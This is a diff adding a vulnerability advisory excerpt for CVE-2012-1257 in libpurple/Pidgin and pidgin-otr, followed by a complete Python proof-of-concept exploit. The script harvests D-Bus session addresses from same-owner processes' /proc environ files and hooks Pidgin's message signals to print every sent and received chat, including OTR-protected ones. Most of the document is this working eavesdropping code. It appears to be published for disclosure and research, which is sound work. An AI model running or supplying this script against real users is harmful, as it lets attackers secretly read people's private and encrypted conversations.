@@ -1,0 +1,97 @@
+source: http://www.securityfocus.com/bid/52175/info
+
+libpurple is prone to an information-disclosure vulnerability.
+
+Successful exploits may allow attackers to obtain potentially sensitive information that may aid in other attacks.
+
+The following products are vulnerable:
+
+libpurple versions prior to 2.10.1
+pidgin versions prior to 2.10.1
+pidgin-otr versions prior to 3.2.0 
+
+#!/usr/bin/env python
+# PoC for snooping on pidgin discussions (OTR/non-OTR) via dbus
+# (see CVE-2012-1257)
+#
+# requires python-dbus and python-gobject
+#
+# based on sample code found here:
+# http://developer.pidgin.im/wiki/DbusHowto
+#
+# Disclaimer: There's virtually no error handling here,
+# so don't rely on this for any serious work.
+#
+# Author:
+# Dimitris Glynos :: { dimitris at census dash labs dot com }
+
+import dbus, gobject, os, sys
+from dbus.mainloop.glib import DBusGMainLoop
+
+# same owner processes get to snoop their respective DBUS credentials
+# via /proc/<pid>/environ
+
+def obtain_dbus_session_creds():
+	all_pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
+	env_tmpl = '/proc/%s/environ'
+	session_creds = {}
+
+	for pid in all_pids:
+		if not (os.stat(env_tmpl % pid).st_uid == os.getuid()):
+			continue
+		if not os.access(env_tmpl % pid, os.R_OK):
+			continue
+
+		f = open(env_tmpl % pid, 'rb')
+		contents = f.read()
+		f.close()
+		for var in contents.split('\0'):
+			if var.startswith('DBUS_SESSION_BUS_ADDRESS='):
+				val = var[var.index('=')+1:]
+				if not session_creds.has_key(val):
+					session_creds[val] = 1
+	return session_creds
+
+def recvs(account, contact, msg, conversation, flags):
+	print "received '%s' from %s" % (msg, contact)
+
+def sends(account, contact, msg, conversation, flags):
+	if flags == 1:
+		print "sent '%s' to %s" % (msg, contact)
+
+if not os.environ.has_key('DBUS_SESSION_BUS_ADDRESS'):
+	creds = obtain_dbus_session_creds()
+
+	if len(creds.keys()) == 0:
+		print >> sys.stderr, ( "error: no dbus session " +
+			"credentials could be recovered." )
+		sys.exit(1)
+
+	if len(creds.keys()) > 1:
+		print >> sys.stderr, ( "error: multiple dbus session " +
+			"credentials found!\nPlease rerun with the proper "+
+			"DBUS_SESSION_BUS_ADDRESS env variable\n" +
+			"Here are the recovered credentials:\n")
+		for k in creds.keys():
+			print >> sys.stderr, "DBUS_SESSION_BUS_ADDRESS=%s" % k
+		sys.exit(1)
+
+	os.environ["DBUS_SESSION_BUS_ADDRESS"] = creds.keys()[0]
+
+dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
+bus = dbus.SessionBus()
+
+bus.add_signal_receiver(
+	recvs,
+	dbus_interface="im.pidgin.purple.PurpleInterface",
+	signal_name="ReceivedImMsg"
+)
+
+bus.add_signal_receiver(
+	sends,
+	dbus_interface="im.pidgin.purple.PurpleInterface",
+        signal_name="WroteImMsg"
+)
+
+mainloop = gobject.MainLoop()
+mainloop.run()
